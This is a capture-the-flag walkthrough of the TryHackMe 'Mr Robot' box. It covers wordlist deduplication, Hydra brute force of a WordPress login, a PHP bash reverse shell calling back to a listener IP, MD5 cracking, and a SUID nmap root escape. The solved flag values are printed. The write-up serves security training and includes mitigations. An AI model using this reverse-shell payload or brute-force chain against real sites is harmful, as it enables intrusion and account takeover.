```
 ███╗   ███╗██████╗      ██████╗  ██████╗ ██████╗  ██████╗ ████████╗
 ████╗ ████║██╔══██╗     ██╔══██╗██╔═══██╗██╔══██╗██╔═══██╗╚══██╔══╝
 ██╔████╔██║██████╔╝     ██████╔╝██║   ██║██████╔╝██║   ██║   ██║
 ██║╚██╔╝██║██╔══██╗     ██╔══██╗██║   ██║██╔══██╗██║   ██║   ██║
 ██║ ╚═╝ ██║██║  ██║     ██║  ██║╚██████╔╝██████╔╝╚██████╔╝   ██║
 ╚═╝     ╚═╝╚═╝  ╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚═════╝  ╚═════╝   ╚═╝
              TryHackMe: Mr Robot CTF
```

> 👤 **Author:** farhan | 📅 **Date:** 2026-06-19 | 🏠 **Platform:** TryHackMe | 💀 **Difficulty:** Medium | ⭐ **Rating:** ⭐⭐⭐☆☆

> ⏱️ ~13 min read

---

## Table of Contents

- [Progress Checklist](#progress-checklist)
- [Tools Used](#️-tools-used)
- [TL;DR](#-tldr)
- [Introduction](#-introduction)
- [Recon](#-recon)
- [Foothold](#-foothold)
- [Shell / Access](#-shell--access)
- [Escalation](#-escalation)
- [Exploitation](#-exploitation)
- [Rabbit Holes](#-rabbit-holes)
- [Flag](#-flag)
- [Mitigations](#️-mitigations)
- [Key Takeaway](#-key-takeaway)
- [If I Did It Again](#-if-i-did-it-again)
- [Changelog](#-changelog)

---

## Progress Checklist

- [x] Port scan: SSH (22), HTTP (80), HTTPS (443)
- [x] `robots.txt` → key 1 of 3 + `fsocity.dic` wordlist
- [x] Deduplicated `fsocity.dic` (858,160 → 11,451 words)
- [x] Hydra username enumeration → `elliot`
- [x] Hydra password brute force → `ER28-0652`
- [x] WordPress theme editor → `archive.php` replaced with bash reverse shell
- [x] Shell landed as `daemon`, stabilised fully
- [x] Found `password.raw-md5` for `robot` in `/home/robot/`
- [x] John the Ripper (Raw-MD5 format) → `abcdefghijklmnopqrstuvwxyz`
- [x] `su robot` → key 2 of 3
- [x] SUID nmap (v3.81) found: `--interactive` mode
- [x] `nmap> !sh` → root shell → key 3 of 3

---

## 🛠️ Tools Used

- 🔎 RustScan + Nmap: port scanning and service detection
- 🕷️ Feroxbuster: web directory enumeration
- 🐉 Hydra: two-stage WordPress credential brute force
- 🔓 John the Ripper: MD5 hash cracking (Raw-MD5 format)
- 🌐 WordPress Theme Editor: reverse shell injection
- 🗺️ nmap `--interactive`: SUID GTFOBins shell escape

---

## ⚡ TL;DR

`robots.txt` leaked both key 1 and a custom wordlist. Deduplication shrunk the wordlist from 858K to 11K words before running Hydra in two passes: first for the username (`elliot`), then the password (`ER28-0652`). WordPress theme editor replaced `archive.php` with a bash reverse shell. As `daemon`, a raw MD5 hash in robot's home cracked to the alphabet. As `robot`, SUID nmap v3.81's interactive mode spawned root via `!sh`.

---

## 📖 Introduction

Today's target is **Mr Robot CTF**: a box themed around the TV show of the same name, where everything from the wordlist filename to the username is a reference to the series. It earns its medium difficulty honestly: the username isn't guessable without the custom wordlist, the wordlist is enormous without deduplication, and the route to the shell via the WordPress theme editor requires some persistence when the obvious Metasploit path stumbles. The escalation chain is short but elegant: a two-step hop through `robot` and straight to root via one of the most classic GTFOBins entries that exists: SUID nmap's `--interactive` mode, a feature removed from nmap years ago but preserved here as a deliberate challenge artefact.

### Prerequisites

Readers are assumed to know:

- How to deduplicate a wordlist with `sort` and `uniq`
- How to run Hydra in two separate passes: one for usernames, one for passwords
- How WordPress theme file editing gives code execution
- What SUID nmap interactive mode is and why `!sh` from it spawns a root shell

---

## 🔍 Recon

*(~0 mins into the box)*

### Port Scan

```bash
rustscan -a 10.48.166.199 -r 1-65535 --ulimit 5000 -- -Pn -sC -sV
```

| Port | Service | Version |
| --- | --- | --- |
| 22/tcp | SSH | OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 |
| 80/tcp | HTTP | Apache (WordPress) |
| 443/tcp | HTTPS | Apache (self-signed cert: `www.example.com`) |

Both ports 80 and 443 serve WordPress. The SSL cert is a generic placeholder: nothing to extract from it.

### Web Enumeration

Feroxbuster confirmed the expected WordPress structure: `wp-login.php`, `xmlrpc.php`, `wp-content/`, and theme assets. One critical discovery:

```
200  http://10.48.166.199/robots.txt
```

*`robots.txt` contents:*

```
User-agent: *
fsocity.dic
key-1-of-3.txt
```

Both files are listed without `Disallow`: they're explicitly announced rather than hidden. `key-1-of-3.txt` is the first flag. `fsocity.dic` is a 6.9MB custom wordlist.

### Wordlist Deduplication

*`fsocity.dic` downloaded: checking word count:*

```bash
wc -w fsocity.dic
# 858160
```

858,160 words: most of them duplicates. Running Hydra against this raw would take hours unnecessarily.

*Sorting and deduplicating:*

```bash
sort fsocity.dic | uniq -d > fs-list    # repeated words
sort fsocity.dic | uniq -u >> fs-list   # unique words
wc -w fs-list
# 11451
```

Down to 11,451 words: a 98.7% reduction. Hydra will now finish in minutes rather than hours.

---

## 🚪 Foothold

*(~10 mins into the box)*

### Two-Stage WordPress Brute Force

WordPress login error messages distinguish between "invalid username" and "wrong password for this username": a classic username enumeration vector. This lets us run Hydra in two separate, faster passes rather than a full credential matrix.

**Pass 1: Username enumeration** (failure string: "Invalid username"):

```bash
hydra -L fs-list -p test 10.48.166.199 \
  http-post-form \
  "/wp-login.php:log=^USER^&pwd=^PASS^:F=Invalid username" -t 30
```

```
[80][http-post-form] host: 10.48.166.199   login: elliot   password: test
[80][http-post-form] host: 10.48.166.199   login: Elliot   password: test
[80][http-post-form] host: 10.48.166.199   login: ELLIOT   password: test
```

Username: `elliot` (all three case variants confirmed: WordPress login is case-insensitive for usernames).

**Pass 2: Password brute force** (failure string: "The password you entered for the username"):

```bash
hydra -l elliot -P fs-list 10.48.166.199 \
  http-post-form \
  "/wp-login.php:log=^USER^&pwd=^PASS^:F=The password you entered for the username" -t 30
```

```
[80][http-post-form] host: 10.48.166.199   login: elliot   password: ER28-0652
```

Password: `ER28-0652`: a reference to Elliot Alderson's employee ID from the show.

### WordPress Theme Editor: Reverse Shell

Logged in to the WordPress admin panel. The Theme Editor (`Appearance → Editor`) allows direct PHP file editing. The target: `archive.php` in the Twenty Fifteen theme: a file that won't break site functionality if overwritten.

*Replacing `archive.php` entirely with a bash reverse shell:*

```php
<?php
system("bash -c 'bash -i >& /dev/tcp/192.168.134.217/4444 0>&1'");
?>
```

*Triggering the shell by visiting the archive page:*

```
http://10.48.166.199/?cat=1
```

```
# listener
connect to [192.168.134.217] from (UNKNOWN) [10.48.166.199] 51092
daemon@ip-10-48-166-199:/...twentyfifteen$
```

Shell landed as `daemon`.

### Full Shell Stabilisation

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
stty rows 40 columns 120
```

---

## 🐚 Shell / Access

*(~35 mins into the box)*

*Navigating to robot's home directory:*

```bash
ls /home/robot
# key-2-of-3.txt    password.raw-md5
```

`key-2-of-3.txt` is permission-denied for `daemon`. But `password.raw-md5` is readable:

```bash
cat /home/robot/password.raw-md5
# robot:c3fcd3d76192e4007dfb496cca67e13b
```

A raw MD5 hash for `robot`. The filename helpfully tells you the format.

### Hash Cracking: John (Raw-MD5)

John's auto-detection misidentified the format as LM (a Windows hash type) and cracked nothing. Specifying the format explicitly:

```bash
john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

```
abcdefghijklmnopqrstuvwxyz   (robot)
```

Password: the entire lowercase alphabet in order. Memorable in theory; terrible in practice.

*Switching to `robot`:*

```bash
su robot
# Password: abcdefghijklmnopqrstuvwxyz
robot@ip-10-48-166-199:~$ cat key-2-of-3.txt
822c73956184f694993bede3eb39f959
```

---

## 📈 Escalation

*(~40 mins into the box)*

### SUID nmap: Interactive Mode GTFOBins

*Finding SUID binaries:*

```bash
find / -perm -u=s -type f 2>/dev/null
```

The standout entry:

```
/usr/local/bin/nmap
```

**Why is SUID nmap dangerous?** nmap v3.81 (an extremely old version from ~2005) included an `--interactive` mode that dropped users into a nmap shell. From that shell, `!command` executed arbitrary OS commands, and since nmap ran as root via SUID, those commands ran as root too. This feature was removed from nmap long before most modern systems shipped, but this box preserves it deliberately as the intended escalation path.

```bash
/usr/local/bin/nmap --interactive
```

```
Starting nmap V. 3.81
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
```

```
root@ip-10-48-166-199:~# cat /root/key-3-of-3.txt
04787ddef27c3dee1ee161b21670b4e4
```

---

## 💥 Exploitation

The complete attack chain:

1. **`robots.txt`** → key 1 + `fsocity.dic` wordlist
2. **Wordlist deduplication** → 858K → 11K words
3. **Hydra pass 1** (username enum) → `elliot`; **pass 2** (password) → `ER28-0652`
4. **WordPress theme editor** → `archive.php` → bash reverse shell as `daemon`
5. **`password.raw-md5`** → John (Raw-MD5) → `abcdefghijklmnopqrstuvwxyz`
6. **`su robot`** → key 2
7. **SUID nmap `--interactive`** → `!sh` → root → key 3

---

## 🐇 Rabbit Holes

### WordPress Metasploit `wp_crop_rce` Failure

WPScan flagged CVE-2019-8942 (crop-image RCE): the same exploit that worked on the Blog box, and Metasploit's `wp_crop_rce` module was tried first. It failed to produce a session repeatedly without a clear error. *The exact reason was unclear: possibly a WordPress configuration difference or the Bitnami installation layout affecting the image upload path.* The theme editor manual approach worked cleanly where Metasploit didn't.

### Manual Theme Editor Shell (First Attempt)

Before landing on the `archive.php` approach, the standard `functions.php` and `header.php` theme files were tried first. Multiple attempts failed: *likely because the theme was actively serving requests and PHP syntax errors in core template files caused 500 responses before the shell could fire.* Switching to `archive.php` (a less critical template only loaded on archive pages) and using a clean one-liner rather than the full PentestMonkey shell resolved it.

### John's Auto-Detection (LM Format)

Running `john` on the raw MD5 hash without specifying a format caused it to detect the hash as LM (Windows LAN Manager) and run the wrong algorithm: producing zero results. Always specify `--format=Raw-MD5` for plain MD5 hashes in the format `hash` or `username:hash`. The filename `password.raw-md5` was a direct hint about the format that went unread for longer than it should have.

### `!/bin/sh` vs `!sh` in nmap Interactive

The first attempt typed `!/bin/sh` inside nmap's interactive mode and received "not found." The correct syntax drops the leading `/`: `!sh` works because `sh` is in the system PATH, while `!/bin/sh` is treated as the entire command literal including the exclamation mark prefix. A minor but memorable distinction.

---

## 🏁 Flag

| Flag | Value | Location |
| --- | --- | --- |
| Key 1 | `073403c8a58a1f80d943455fb30724b9` | `/key-1-of-3.txt` (via `robots.txt`) |
| Key 2 | `822c73956184f694993bede3eb39f959` | `/home/robot/key-2-of-3.txt` |
| Key 3 | `04787ddef27c3dee1ee161b21670b4e4` | `/root/key-3-of-3.txt` |

---

## 🛡️ Mitigations

| Vulnerability | Severity | Mitigation |
| --- | --- | --- |
| `robots.txt` listing sensitive files | High | `robots.txt` is public: never list sensitive paths; use proper access controls instead of obscurity |
| Custom wordlist (`fsocity.dic`) served publicly | High | Never expose wordlists, dictionaries, or any non-public asset from the webroot |
| WordPress login username enumeration | Medium | Disable login error message differentiation (use a plugin like WP Cerber or add a filter to `login_errors`) |
| Weak WordPress password (`ER28-0652`) brute-forceable from a 11K wordlist | High | Use a randomly generated password; enable login attempt limiting |
| WordPress Theme Editor enabled for authenticated users | Critical | Disable the theme/plugin editor in `wp-config.php`: `define('DISALLOW_FILE_EDIT', true)` |
| Raw MD5 password hash for system user | Critical | Use properly salted hashes (bcrypt, sha512crypt) for system user passwords |
| SUID bit on ancient nmap v3.81 with interactive mode | Critical | Remove SUID from any binary not explicitly requiring it; replace nmap v3.81 with a modern version: interactive mode was removed specifically because of this escalation path |

---

## 💡 Key Takeaway

> 💡 **Takeaway:** Always deduplicate custom wordlists before feeding them to Hydra: 858,160 entries shrunk to 11,451 is a 75× speed improvement for zero information loss. The extra 30 seconds of `sort | uniq` preprocessing is the difference between a 5-minute brute force and an all-night one.

---

## 🔁 If I Did It Again

Skip Metasploit's `wp_crop_rce` entirely and go straight to the theme editor: authenticated WordPress code execution via theme file editing is faster, more reliable, and requires no dependencies beyond a text editor and a listener. Also specify `--format=Raw-MD5` in John immediately rather than letting it auto-detect.

---

## 🔚 Changelog

*Last updated: 2026-06-19*

---

[↑ Back to top](#)
